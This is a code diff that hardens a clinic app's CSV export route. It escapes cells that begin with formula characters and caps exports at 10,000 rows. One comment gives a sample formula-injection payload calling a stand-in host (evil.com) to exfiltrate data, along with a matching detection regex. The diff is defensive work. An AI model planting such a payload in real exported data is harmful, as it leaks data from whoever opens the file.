@@ -3,23 +3,28 @@ import { auth } from "@/auth";
 import { db } from "@/lib/tenant-db";
 import { isAdmin } from "@/lib/permissions";
 
+const MAX_EXPORT_ROWS = 10_000;
+
+// Excel / Google Sheets / LibreOffice treat cells starting with =, +, -, @,
+// \t, or \r as formulas. A reviewerName of `=IMPORTXML(evil.com/x, ...)`
+// would exfiltrate data when opened. Prefix any such value with a single
+// quote so the formula engine treats it as a literal string.
+const CSV_FORMULA_LEADERS = /^[=+\-@\t\r]/;
+
+function escapeCell(v: unknown): string {
+  if (v === null || v === undefined) return "";
+  let s = typeof v === "object" ? JSON.stringify(v) : String(v);
+  if (CSV_FORMULA_LEADERS.test(s)) s = "'" + s;
+  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
+  return s;
+}
+
 function toCsv<T extends Record<string, unknown>>(rows: T[]): string {
   if (rows.length === 0) return "";
   const headers = Object.keys(rows[0]);
-  const lines = [headers.join(",")];
+  const lines = [headers.map(escapeCell).join(",")];
   for (const r of rows) {
-    lines.push(
-      headers
-        .map((h) => {
-          const v = r[h];
-          if (v === null || v === undefined) return "";
-          const s =
-            typeof v === "object" ? JSON.stringify(v) : String(v);
-          if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
-          return s;
-        })
-        .join(","),
-    );
+    lines.push(headers.map((h) => escapeCell(r[h])).join(","));
   }
   return lines.join("\n");
 }
@@ -44,7 +49,7 @@ export async function GET(req: Request) {
   const t = db(session.user.clinicId);
 
   let rows: Array<Record<string, unknown>> = [];
-  let filename = `${kind}.csv`;
+  const filename = `${kind}.csv`;
 
   switch (kind) {
     case "patients": {
@@ -142,6 +147,19 @@ export async function GET(req: Request) {
         { success: false, error: "Unknown export kind" },
         { status: 400 },
       );
+  }
+
+  // Refuse massive exports — holding all bills in memory on a shared
+  // serverless instance is a DoS pathway. Admins must narrow with filters.
+  if (rows.length > MAX_EXPORT_ROWS) {
+    return NextResponse.json(
+      {
+        success: false,
+        error:
+          "Too many rows to export. Narrow your export using filters first.",
+      },
+      { status: 413 },
+    );
   }
 
   const csv = toCsv(rows);
